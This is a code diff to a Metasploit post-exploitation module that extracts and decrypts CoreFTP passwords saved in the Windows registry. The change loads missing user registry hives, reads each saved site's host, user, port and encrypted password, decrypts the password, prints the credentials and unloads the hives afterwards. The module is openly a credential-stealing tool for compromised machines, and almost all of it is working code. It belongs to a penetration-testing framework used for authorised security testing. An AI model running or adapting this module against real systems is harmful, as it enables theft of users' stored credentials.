@@ -12,10 +12,12 @@
 require 'msf/core'
 require 'rex'
 require 'msf/core/post/windows/registry'
+require 'msf/core/post/windows/user_profiles'
 
 class Metasploit3 < Msf::Post
 	include Msf::Post::Windows::Registry
 	include Msf::Auxiliary::Report
+	include Msf::Post::Windows::UserProfiles
 
 	def initialize(info={})
 		super( update_info( info,
@@ -23,7 +25,8 @@ class Metasploit3 < Msf::Post
 				'Description'   => %q{
 					This module extracts saved passwords from the CoreFTP FTP client. These 
 				passwords are stored in the registry. They are encrypted with AES-128-ECB. 
-				This module extracts and decrypts these passwords.},
+				This module extracts and decrypts these passwords.
+				},
 				'License'       => MSF_LICENSE,
 				'Author'        => ['TheLightCosine <thelightcosine[at]gmail.com>'],
 				'Version'       => '$Revision$',
@@ -33,22 +36,23 @@ class Metasploit3 < Msf::Post
 	end
 
 	def run
-		registry_enumkeys('HKU').each do |k|
-			next unless k.include? "S-1-5-21"
-			next if k.include? "_Classes"
-			print_status("Looking at Key #{k}")
+		userhives=load_missing_hives()
+		userhives.each do |hive|
+			next if hive['HKU'] == nil 
+			print_status("Looking at Key #{hive['HKU']}")
 			begin
-				subkeys = registry_enumkeys("HKU\\#{k}\\Software\\FTPware\\CoreFTP\\Sites")
+				subkeys = registry_enumkeys("#{hive['HKU']}\\Software\\FTPware\\CoreFTP\\Sites")
 				if subkeys.empty? or subkeys.nil?
 					print_status ("CoreFTP not installed for this user.")
 					return
 				end
 
 				subkeys.each do |site|
-					host = registry_getvaldata("HKU\\#{k}\\Software\\FTPware\\CoreFTP\\Sites\\#{site}", "Host")
-					user = registry_getvaldata("HKU\\#{k}\\Software\\FTPware\\CoreFTP\\Sites\\#{site}", "User")
-					port = registry_getvaldata("HKU\\#{k}\\Software\\FTPware\\CoreFTP\\Sites\\#{site}", "Port")
-					epass = registry_getvaldata("HKU\\#{k}\\Software\\FTPware\\CoreFTP\\Sites\\#{site}", "PW")
+					site_key = "#{hive['HKU']}\\Software\\FTPware\\CoreFTP\\Sites\\#{site}"
+					host = registry_getvaldata(site_key, "Host")
+					user = registry_getvaldata(site_key, "User")
+					port = registry_getvaldata(site_key, "Port")
+					epass = registry_getvaldata(site_key, "PW")
 					next if epass == nil or epass == ""
 					pass = decrypt(epass)
 					print_good("Host: #{host} Port: #{port} User: #{user}  Password: #{pass}")
@@ -61,9 +65,10 @@ class Metasploit3 < Msf::Post
 					report_auth_info(auth)
 				end
 			rescue
-				print_status("Not Installed for this User or Cannot Access User SID: #{k}")
+				print_status("Not Installed for this User or Cannot Access User SID: #{hive['HKU']}")
 			end 
 		end
+		unload_our_hives(userhives)
 	end
 
 	def decrypt(encoded)
